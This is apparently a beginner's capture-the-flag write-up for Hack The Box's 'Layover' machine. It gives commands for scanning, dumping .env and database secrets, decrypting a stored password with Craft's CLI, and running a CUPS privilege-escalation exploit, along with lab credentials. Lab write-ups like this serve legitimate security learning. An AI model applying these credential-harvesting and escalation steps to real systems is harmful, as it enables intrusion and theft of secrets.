![HTB Layover Machine](https://raw.githubusercontent.com/DeadSec0Chair/HackTheBox-Layover-Writeup/refs/heads/main/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png)
# HTB Layover — Writeup

**Machine:** Layover
**Platform:** Hack The Box
**OS:** Linux (with Windows Jump Host)
**Status:** Rooted

---

## Overview

Layover was an interesting machine that required chaining multiple discoveries together. The initial RDP access provided a foothold into an internal network, which then led to Wi-Fi traffic analysis, credential discovery, an internal portal running Craft CMS, authenticated RCE, SSH access, and finally a CUPS local privilege escalation to root.

**Attack Chain:**

RDP → Wi-Fi Traffic Analysis → Credentials → Internal Portal → Craft CMS → RCE → SSH → CUPS LPE → Root

---

## 1. Initial Enumeration

Started with a standard Nmap scan against the target.

nmap -sC -sV -p- <TARGET_IP>

Open ports:
- 22/tcp — SSH (OpenSSH)
- 3389/tcp — RDP (Remote Desktop)

Since RDP was available and valid credentials were provided, it was used as the initial entry point.

---

## 2. RDP Access

Connected to the Windows jump host using the provided credentials.

Credentials:
- Username: contractor
- Password: Contractor2026!

Hostname: airside-ws01

Once logged in, it became clear this host had access to an internal wireless network that was not directly reachable from the attacking machine.

---

## 3. Internal Network & Wi-Fi

Checked the available network interfaces.

ipconfig /all

One of the wireless interfaces was connected to HTB International WiFi with an internal IP:

10.13.37.182/24

This opened up a new attack path — instead of exploiting services directly, I started analyzing the wireless traffic available from the compromised environment.

---

## 4. Wi-Fi Traffic Analysis

By analyzing the wireless traffic, I was able to recover another set of credentials.

Credentials recovered:
- Username: jenny
- Password: Fl1ghtDeck2026!

These credentials turned out to be useful for an internal web application.

Note: This is a good example of why traffic analysis can be valuable after gaining access to an intermediate system.

---

## 5. Internal Portal

Discovered an internal portal at:

http://portal.international.htb/miles/login.php

Logged in using the recovered jenny credentials.

Dashboard information (Jenny Crawford):
- Member ID: HA-4471880
- Membership: Gold Member
- Miles: 48,250
- Upcoming Booking: KS7X2M

While enumerating the application, I discovered another interesting endpoint:

/admin

Which redirected to:

/admin/login

The application was running Craft CMS.

---

## 6. Craft CMS Enumeration

The CMS identified itself as:

- Craft CMS
- Version: 5.9.8

At this point, I researched the version and its attack surface. The important part was that I already had authenticated access to the CMS, which made authenticated vulnerabilities particularly relevant.

After working through the applicable Craft CMS attack path, I was able to achieve remote code execution.

---

## 7. Craft CMS RCE

The successful exploitation gave me command execution on the underlying server.

Shell running as:

www-data

Now I had code execution on the Linux server. From here, the attack shifted from web application exploitation to local enumeration and credential discovery.

---

## 8. Local Enumeration (www-data)

### 8.1 — Host Discovery

cat /etc/hosts

Output:

10.13.37.10 portal.international.htb international.htb www.international.htb

This confirmed that 10.13.37.10 was the internal server.

### 8.2 — Finding the .env File

find / -name ".env" -readable 2>/dev/null

Output:

/var/www/portal/.env

### 8.3 — Reading the .env File

cat /var/www/portal/.env

Key contents:

CRAFT_SECURITY_KEY=IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr
CRAFT_DB_USER=craftuser
CRAFT_DB_PASSWORD=CraftDB_pw_2026
CRAFT_DB_DATABASE=craft

### 8.4 — Database Enumeration

mysql -u craftuser -p'CraftDB_pw_2026' craft -e "show tables;"

Found the users table:

mysql -u craftuser -p'CraftDB_pw_2026' craft -e "select * from users;"

Found admin and jenny users with bcrypt password hashes (not crackable easily).

### 8.5 — Searching for aporter

grep -r "aporter" /var/www /opt /srv /tmp /var/backups /etc 2>/dev/null | grep -v "/etc/passwd\|/etc/group"

Key finding:

/var/www/portal/modules/htbairways/console/controllers/MilesController.php

### 8.6 — Reading the Controller

cat /var/www/portal/modules/htbairways/console/controllers/MilesController.php

Important findings:
- The relay password is stored encrypted in the htbairways_settings table
- The user is aporter
- The password is encrypted using Craft's Security component with the site's security key

### 8.7 — Extracting the Encrypted Password

mysql -u craftuser -p'CraftDB_pw_2026' craft -e "select * from htbairways_settings;"

Output:

id | name | value
1  | mailRelayPassword | u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w=
2  | mailRelayHost     | mail.htbairways.htb
3  | mailRelayPort     | 587
4  | mailRelayUser     | aporter

### 8.8 — Decrypting the Password

Using Craft CMS CLI's exec command:

cd /var/www/portal
php craft exec "echo Craft::\$app->getSecurity()->decryptByKey(base64_decode('u0E7OgbBeWhhPn1HajsFMDg0ZDJhNzUwZTUyNGMxYjBlZDk0MGFkZWE5MmEyMzc0ZjhmMmM4OGNiNTRiNDAzZTA2YWFjM2U5OWU2YWIzMGUPrGNmIwqUOPL3Y0gahxRF5wvwsBHdA3Pf4+d1XnQ4I3W/cqDF7Pr/58qVfPoNl5w='), 'IGckihiFK64_lrSgJJ6QLkiPz-ow13Lr')"

Decrypted password:

Skyp0rt_Relay!26

---

## 9. SSH Access

Connected to the internal server using the recovered credentials.

ssh aporter@10.13.37.10

Password: Skyp0rt_Relay!26

User flag was obtained from the user's home directory.

---

## 10. Local Enumeration (aporter)

With SSH access established, I started enumerating the system for possible privilege-escalation paths.

### 10.1 — Checking CUPS

systemctl status cups

Output:

/usr/sbin/cupsd -f

There was also a custom systemd service configuration:

cat /etc/systemd/system/cups.service

Contents:

Environment=LD_LIBRARY_PATH=/usr/lib64

CUPS was also listening locally on:

127.0.0.1:631

### 10.2 — Identifying the CUPS Version

cups-config --version

Output:

2.4.16

The installed version was vulnerable to a local privilege-escalation vulnerability: CVE-2026-34990.

---

## 11. CUPS Privilege Escalation

I prepared the applicable proof-of-concept and transferred it to the target.

The exploit initially returned an error because the Python script was missing an import:

NameError: name 'os' is not defined

Fixed the script by adding the required import:

sed -i '2i import os' /tmp/exploit.py

Then executed it:

python3 /tmp/exploit.py

The exploit successfully elevated privileges.

Root shell obtained.

---

## 12. Root

At this point, the machine was fully compromised.

Final privilege-escalation path:

aporter
   ↓
CUPS 2.4.16
   ↓
CVE-2026-34990
   ↓
root

Root flag obtained from /root/root.txt.

---

## Complete Attack Chain

Internet
   │
   ▼
RDP
   │
   ▼
Windows Jump Host (airside-ws01)
   │
   ▼
Wi-Fi Traffic Analysis
   │
   ▼
Jenny Credentials (jenny:Fl1ghtDeck2026!)
   │
   ▼
Internal Portal (portal.international.htb)
   │
   ▼
Craft CMS 5.9.8
   │
   ▼
Authenticated RCE
   │
   ▼
www-data
   │
   ▼
Local Enumeration → aporter credentials
   │
   ▼
SSH (aporter@10.13.37.10)
   │
   ▼
CUPS 2.4.16
   │
   ▼
CVE-2026-34990
   │
   ▼
ROOT

---

## Credentials Discovered

Username   | Password           | Purpose
contractor | Contractor2026!    | RDP access
jenny      | Fl1ghtDeck2026!    | Internal portal
craftuser  | CraftDB_pw_2026    | MySQL database
aporter    | Skyp0rt_Relay!26   | SSH access

---

## Vulnerabilities Used

Vulnerability   | Type                          | Location
Craft CMS 5.9.8 | Authenticated RCE             | /admin
CVE-2026-34990  | CUPS Local Privilege Escalation | cupsd 2.4.16

---

## Key Takeaways

1. RDP access alone wasn't enough — it provided access to a system that could see an internal network.
2. Wi-Fi traffic analysis exposed credentials, which opened the internal portal.
3. The portal led to Craft CMS, which provided the route to RCE.
4. Custom modules (like htbairways) can hide sensitive data — always enumerate them.
5. Craft CMS CLI (php craft exec) is a powerful tool for decrypting stored credentials.
6. Local enumeration after obtaining SSH revealed the vulnerable CUPS installation.
7. The machine was essentially a chain of smaller discoveries rather than one single obvious vulnerability.

---

## Tools Used

- Nmap
- RDP Client
- Wireshark / tcpdump (Wi-Fi analysis)
- MySQL Client
- Craft CMS CLI (php craft)
- Netcat
- Python3
- CUPS Exploit (CVE-2026-34990 PoC)

---

## References

- Craft CMS Documentation: https://craftcms.com/docs
- CVE-2026-34990 Details: https://nvd.nist.gov/vuln/detail/CVE-2026-34990
- HTB Layover Machine: https://app.hackthebox.com/machines/Layover

---

## A Note from the Author

I'm a beginner in penetration testing and CTFs. This writeup is my personal documentation of how I approached and solved the Layover machine on Hack The Box.

I'm sharing this in case anyone finds it helpful for their own learning journey. Please keep in mind:

- Some steps might be obvious to more experienced players.
- Some steps might not be the most optimal or "correct" way to do things.
- I may have made mistakes along the way.
- This is a learning experience for me, and I'm sharing it as-is.

If you spot any errors or have suggestions for improvement, feel free to reach out. We're all here to learn.

---

**Written by:** [Your Name]
**Date:** 2026-10-03

---

> **Disclaimer:** This writeup is for educational purposes only. The techniques described here should only be used on systems you have explicit permission to test.
